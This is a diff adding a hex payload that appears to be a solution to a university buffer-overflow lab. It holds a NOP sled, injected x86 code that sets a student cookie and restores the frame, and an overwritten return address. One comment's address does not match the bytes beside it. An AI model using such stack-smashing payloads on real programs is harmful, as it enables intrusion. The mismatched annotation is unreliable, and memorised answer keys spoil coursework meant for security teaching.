@@ -1,0 +1,36 @@
+/* 520 Byte Buffer */
+/* 100 Byte */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+/* 100 Byte */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+/* 100 Byte */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+/* 100 Byte */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+/* 105 Byte */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* buffer: NOP instruction */
+90 90 90 90 90 /* buffer: NOP instruction */
+/* Exploit Code 15 Byte */
+b8 ae 2e 71 47 /* mov $0x47712eae(cookie for 2015011372), %eax(return value) */
+8d 6c 24 18 /* lea 0x18(%esp)(old %ebp for testn), %ebp */
+68 0e 8d 04 08 /* push $0x8048c57(old %edi, testn() call getbufn() next instruction) */
+c3 /* ret */
+/* Fill %ebp 4 Byte */
+00 00 00 00
+/* Return to line 1 to line 26 somewhere position, NOP(0x90) means no operation, 4 Byte */
+80 34 68 55
